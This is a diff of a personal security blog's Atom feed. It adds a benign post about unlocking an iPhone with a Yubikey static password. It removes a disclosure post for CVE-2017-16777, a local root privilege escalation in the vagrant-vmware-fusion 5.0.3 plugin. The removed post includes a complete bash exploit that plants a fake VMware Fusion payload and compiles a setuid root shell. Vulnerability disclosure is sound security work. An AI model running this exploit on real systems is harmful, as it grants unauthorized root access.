@@ -6,7 +6,67 @@
   </author>
   <id>http://m4.rkw.io/blog/</id>
   <title>m4.rkw.io</title>
-  <updated>2021-06-17T15:22:56+01:00</updated>
+  <updated>2021-07-08T21:07:41+01:00</updated>
+  <entry>
+    <id>http://m4.rkw.io/blog/unlocking-ios-devices-with-a-yubikey.html</id>
+    <link href="http://m4.rkw.io/blog/unlocking-ios-devices-with-a-yubikey.html"/>
+    <summary>&lt;pre&gt;I love Yubikeys, they provide a very strong second factor for accounts and
+services that you care a lot about. I use them for all kinds of things but one
+thing I was quite excited to try was the Yubikey 5ci in static password mode.
+
+On Yubikeys 5-series keys static password mode simply acts as a virtual
+keyboard, playing back a static sequence of characters over the connected
+interface (usually USB). I wasn&amp;#39;t sure at first if this was supported over the
+lightning port but it turns out it is which is very cool.
+
+Using static password mode to supply the entire password for something is a bad
+idea - if someone steals the key then they have the entire password and there&amp;#39;s
+no way to protect it on the key. Plug it in, press the sensor and voila you&amp;#39;ve
+got the entire secret string. But using it in combination with a known
+passphrase is very powerful. I was quite excited about the idea of using this on
+iOS - a relatively simple password combined with a huge amount of extra entropy
+from the Yubikey as a salt.
+
+If you&amp;#39;re going to attempt this, DON&amp;#39;T do what I did first and set the password
+on the iPhone using the Yubikey. This is a really really bad idea - I did this
+at first and although it appeared to work, the password set correctly, as soon
+as I tried to unlock the phone by typing my passphrase and then activating the
+Yubikey it didn&amp;#39;t unlock. This was quite unnerving at the time but luckily I had
+the secret string emitted by the key noted down and simply typing it in
+carefully got me back into the phone. So learn from my mistake - type the
+password into the iPhone very carefully rather than using the key to set it,
+because if it just happens to fail in the same way twice in that moment you
+might find yourself locked out of your device and facing the prospect of either
+a lot of tedious guesswork (which and how many characters were dropped) or worse
+- restoring from a backup.
+
+The reason it failed to unlock was because the default output speed of the
+Yubikey is too fast for an iPhone (it&amp;#39;s a modern iPhone too - 12 Mini). I did
+some testing and determined that I had to configure the maximum possible delay
+of 60ms in the Yubikey Personalisation Tool before it would work semi-reliably.
+Even with this extra delay it&amp;#39;s not 100% but it works most of the time.
+
+But now that it does it&amp;#39;s really cool, as well as FaceID when that&amp;#39;s active I
+now have a much stronger password protecting the device when it&amp;#39;s locked without
+the huge inconvenience of typing a very long password into it manually.
+
+There are a couple of downsides - you have to enable USB access on the lock
+screen or else the key won&amp;#39;t be able to talk to the phone in order to send the
+keys. This seems like a reasonable trade-off for most people though - if you&amp;#39;ve
+got someone plugging hardware into your phone to try to break into it you&amp;#39;ve
+likely got much bigger things to worry about than me. To enable USB access go
+to Settings -&amp;gt; FaceID &amp;amp; Passcode and make sure the &amp;quot;USB Accessories&amp;quot; checkbox
+is enabled. The other downside is that the Apple leather case doesn&amp;#39;t quite
+have a big enough hole around the lightning socket for the key to insert, but
+that&amp;#39;s easily solved with a bit of sandpaper.
+
+If you&amp;#39;re going to attempt this make sure you backup the secret password
+somewhere, I recommend storing it in an encrypted file and making several
+backups, including at least one offline.&lt;/pre&gt;</summary>
+    <title>Unlocking iOS devices with a Yubikey</title>
+    <updated>2021-07-08T20:53:22+01:00</updated>
+    <dc:date>2021-07-08T20:53:22+01:00</dc:date>
+  </entry>
   <entry>
     <id>http://m4.rkw.io/blog/how-to-use-touchid-for-sudo-remotely-over-ssh.html</id>
     <link href="http://m4.rkw.io/blog/how-to-use-touchid-for-sudo-remotely-over-ssh.html"/>
@@ -2453,173 +2513,5 @@ done
     <updated>2017-11-29T19:02:01+00:00</updated>
     <dc:date>2017-11-29T19:02:01+00:00</dc:date>
   </entry>
-  <entry>
-    <id>http://m4.rkw.io/blog/cve201716777-local-root-privesc-in-hashicorp-vagrantvmwarefusion-503.html</id>
-    <link href="http://m4.rkw.io/blog/cve201716777-local-root-privesc-in-hashicorp-vagrantvmwarefusion-503.html"/>
-    <summary>&lt;pre&gt;Another day, another root privesc bug in this plugin. Not quite so serious this
-time - this one is only exploitable if the user has the plugin installed but
-VMware Fusion *not* installed. This is a fairly unlikely scenario but it&amp;#39;s a
-straight to root privesc with no user interaction so isn&amp;#39;t the kind of thing
-that should be shipping with any software.
-
-This occurs because the suid root sudo helper that I have discussed in previous
-exploit writeups executes /Applications/VMware
-Fusion.app/Contents/Library/vmnet-cli
-as root, but if the application isn&amp;#39;t installed and we&amp;#39;re a local admin user we
-can create a fake app directory with a payload in place of vmnet-cli that gets
-executed as root.
-
-HashiCorp fixed this (very quickly) in 5.0.4.
-
-&lt;a href=&quot;https://m4.rkw.io/vagrant_vmware_privesc_5.0.3.sh.txt&quot;&gt;https://m4.rkw.io/vagrant_vmware_privesc_5.0.3.sh.txt&lt;/a&gt;
-3c11083386b3f7352d60b327190eed4364383c0622351db5410d809f4bda746a
-------------------------------------------------------------------------------
-#!/bin/bash
-echo
-echo &amp;quot;#########################################################&amp;quot;
-echo &amp;quot;# vagrant_vmware_fusion plugin 5.0.3 local root privesc #&amp;quot;
-echo &amp;quot;# by m4rkw - &lt;a href=&quot;https://m4.rkw.io/blog.html                #&amp;quot&quot;&gt;https://m4.rkw.io/blog.html                #&amp;quot&lt;/a&gt;;
-echo &amp;quot;#########################################################&amp;quot;
-echo &amp;quot;# Note: only works when VMWare Fusion is not installed. #&amp;quot;
-echo &amp;quot;#########################################################&amp;quot;
-echo
-
-cleanup() {
-  exec 2&amp;gt; /dev/null
-  killall -9 vagrant 1&amp;gt;/dev/null 2&amp;gt;/dev/null
-  kill -9 `ps auxwww |egrep &amp;#39;\/vagrant up$&amp;#39; |xargs -L1 |cut -d &amp;#39; &amp;#39; -f2` &amp;amp;&amp;gt;/dev/null
-  exec 2&amp;gt; /dev/tty
-  cd
-  rm -rf .vagrant_vmware_fusion_503_exp
-  rm -rf /Applications/VMware\ Fusion.app
-}
-
-if [ -e &amp;quot;/Applications/VMware Fusion.app&amp;quot; ] ; then
-  echo &amp;quot;Fusion is installed, not exploitable.&amp;quot;
-  exit 1
-fi
-
-echo &amp;quot;setting up fake app directory...&amp;quot;
-
-mkdir /Applications/VMware\ Fusion.app
-if [ ! $? -eq 0 ] ; then
-  echo &amp;quot;Failed to create /Applications/VMware Fusion.app.&amp;quot;
-  exit 1
-fi
-
-mkdir -p /Applications/VMware\ Fusion.app/Contents/Library/services
-
-touch /Applications/VMware\ Fusion.app/Contents/Library/vmrun
-touch /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
-chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmrun
-chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
-
-cat &amp;gt; /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx &amp;lt;&amp;lt;EOF
-#!/bin/bash
-echo 1&amp;gt;&amp;amp;2
-echo &amp;quot;VMware Fusion Information:&amp;quot; 1&amp;gt;&amp;amp;2
-echo &amp;quot;VMware Fusion 10.0.1 build-6754183 Release&amp;quot; 1&amp;gt;&amp;amp;2
-echo
-EOF
-
-chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx
-
-cat &amp;gt; /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli &amp;lt;&amp;lt;EOF
-#!/bin/bash
-chown root:wheel /tmp/vvp_503
-chmod 4755 /tmp/vvp_503
-EOF
-
-chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli
-
-echo &amp;quot;compiling payload...&amp;quot;
-
-cat &amp;gt; /tmp/vvp_503.c &amp;lt;&amp;lt;EOF
-#include &amp;lt;unistd.h&amp;gt;
-int main()
-{
-  setuid(0);
-  seteuid(0);
-  execl(&amp;quot;/bin/bash&amp;quot;,&amp;quot;bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;rm -f /tmp/vvp_503; /bin/bash&amp;quot;,NULL);
-  return 0;
-}
-EOF
-gcc -o /tmp/vvp_503 /tmp/vvp_503.c
-rm -f /tmp/vvp_503.c
-
-cd
-mkdir .vagrant_vmware_fusion_503_exp
-cd .vagrant_vmware_fusion_503_exp
-
-echo &amp;quot;writing dummy vagrantfile ...&amp;quot;
-
-cat &amp;gt; vagrantfile &amp;lt;&amp;lt;EOF
-Vagrant.configure(&amp;#39;2&amp;#39;) do |config|
-  config.vm.box = &amp;#39;envimation/ubuntu-xenial&amp;#39;
-end
-EOF
-
-echo &amp;quot;triggering vagrant up [stage 1]...&amp;quot;
-
-vagrant up &amp;amp;&amp;gt;/dev/null &amp;amp;
-
-while :
-do
-  r=`ps auxwww |grep &amp;#39;vagrant up&amp;#39; |grep -v grep`
-  if [ &amp;quot;$r&amp;quot; == &amp;quot;&amp;quot; ] ; then
-    break
-  fi
-  sleep 0.5
-done
-
-echo &amp;quot;dropping dummy machine...&amp;quot;
-
-uuid=`ls -1 .vagrant/machines/default/vmware_fusion |grep -v vagrant_cwd`
-touch .vagrant/machines/default/vmware_fusion/$uuid/ubuntu-xenial-vmware-fusion.vmx
-echo -n &amp;quot;`pwd`/.vagrant/machines/default/vmware_fusion/$uuid/ubuntu-xenial-vmware-fusion.vmx&amp;quot; &amp;gt; .vagrant/machines/default/vmware_fusion/id
-
-echo &amp;quot;triggering vagrant up [stage 2]...&amp;quot;
-
-vagrant up &amp;amp;&amp;gt;/dev/null &amp;amp;
-
-echo &amp;quot;waiting for payload to trigger ...&amp;quot;
-
-count=0
-success=0
-
-while :
-do
-  r=`ls -la /tmp/vvp_503 |grep -- &amp;#39;-rwsr-xr-x  1 root  wheel&amp;#39;`
-  if [ &amp;quot;$r&amp;quot; != &amp;quot;&amp;quot; ] ; then
-    success=1
-    break
-  fi
-  r=`ps auxwww |grep &amp;#39;vagrant up&amp;#39; |grep -v grep`
-  if [ &amp;quot;$r&amp;quot; == &amp;quot;&amp;quot; ] ; then
-    break
-  fi
-  sleep 0.2
-  count=$(($count + 1))
-  if [ $count -eq 250 ] ; then
-    echo &amp;quot;Timed out waiting for the payload to trigger.&amp;quot;
-    cleanup
-    exit 1
-  fi
-done
-
-cleanup
-
-if [ ! $success -eq 1 ] ; then
-  echo &amp;quot;exploit failed.&amp;quot;
-  exit 1
-fi
-
-echo
-cd
-/tmp/vvp_503&lt;/pre&gt;</summary>
-    <title>CVE-2017-16777 Local root privesc in Hashicorp vagrant-vmware-fusion 5.0.3</title>
-    <updated>2017-11-15T08:21:15+00:00</updated>
-    <dc:date>2017-11-15T08:21:15+00:00</dc:date>
-  </entry>
-  <dc:date>2021-06-17T15:22:56+01:00</dc:date>
+  <dc:date>2021-07-08T21:07:41+01:00</dc:date>
 </feed>
